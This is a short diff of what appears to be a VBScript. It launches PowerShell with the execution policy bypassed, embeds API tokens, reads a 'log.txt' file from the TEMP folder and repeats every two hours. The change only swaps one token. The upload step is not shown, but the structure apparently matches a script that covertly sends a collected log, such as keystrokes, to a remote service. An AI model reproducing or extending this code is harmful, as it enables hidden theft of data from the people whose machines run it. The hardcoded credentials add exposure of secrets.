@@ -14,7 +14,7 @@ End If
 
 ' Define the PowerShell script for API execution
 psCommand = "powershell -ExecutionPolicy Bypass -NoProfile -Command " & _
-    "$API_TOKEN='a9se14sxwrphtspbmh4bn4ccrffd7q'; " & _
+    "$API_TOKEN='aw4tthbiwn2sg69hq912j193iair43'; " & _
     "$USER_KEY='u2m1rdameavmjmg6abkauqy6ejdqk7'; " & _
     "$FILE_PATH=[System.IO.Path]::Combine($env:TEMP,'log.txt'); " & _
     "if (-Not (Test-Path $FILE_PATH)) {exit}; " & _
@@ -34,3 +34,4 @@ Do
     ' Sleep for 2 hour (3600000 milliseconds)
     WScript.Sleep 7200000
 Loop
+
